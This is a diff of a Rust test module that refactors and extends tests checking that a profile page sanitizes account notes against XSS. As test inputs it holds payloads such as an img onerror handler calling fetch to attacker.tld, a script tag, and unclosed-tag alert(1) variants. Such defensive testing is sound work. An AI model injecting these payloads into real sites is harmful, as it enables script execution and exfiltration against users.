@@ -284,13 +284,12 @@ mod tests {
 
     use super::{ProfilePage, ProfilePageProps};
 
-    #[test]
-    fn profile_page_sanitizes_account_note_xss() {
+    fn render_profile_note(note: &str) -> String {
         let account = Account {
             id: "1".to_owned(),
             acct: "alice@example.org".to_owned(),
             display_name: "Alice".to_owned(),
-            note: "<p>bio</p><img src=x onerror=\"fetch('https://attacker.tld')\"><script>steal()</script>".to_owned(),
+            note: note.to_owned(),
             avatar: String::new(),
             header: String::new(),
             bot: false,
@@ -303,7 +302,7 @@ mod tests {
             indexable: None,
             noindex: None,
         };
-        let rendered = Owner::new().with(|| {
+        Owner::new().with(|| {
             let statuses = Signal::derive(Vec::new);
             ProfilePage(ProfilePageProps {
                 account,
@@ -321,10 +320,30 @@ mod tests {
                 show_verbs: false,
             })
             .to_html()
-        });
+        })
+    }
+
+    #[test]
+    fn profile_page_sanitizes_account_note_xss() {
+        let rendered = render_profile_note(
+            "<p>bio</p><img src=x onerror=\"fetch('https://attacker.tld')\"><script>steal()</script>",
+        );
         assert!(!rendered.contains("onerror"), "{rendered}");
         assert!(!rendered.contains("attacker.tld"), "{rendered}");
         assert!(!rendered.contains("<script"), "{rendered}");
         assert!(rendered.contains("<p>bio</p>"), "{rendered}");
+    }
+
+    #[test]
+    fn profile_page_blocks_unclosed_tag_and_open_quote_xss_on_ssr() {
+        for payload in [
+            "<img src=x onerror=\"alert(1)\" ",
+            "<img src=x onerror=\"alert(1)\" alt=\"",
+        ] {
+            let rendered = render_profile_note(payload);
+            assert!(!rendered.contains("<img"), "{rendered}");
+            assert!(!rendered.contains("onerror"), "{rendered}");
+            assert!(!rendered.contains("alert(1)"), "{rendered}");
+        }
     }
 }
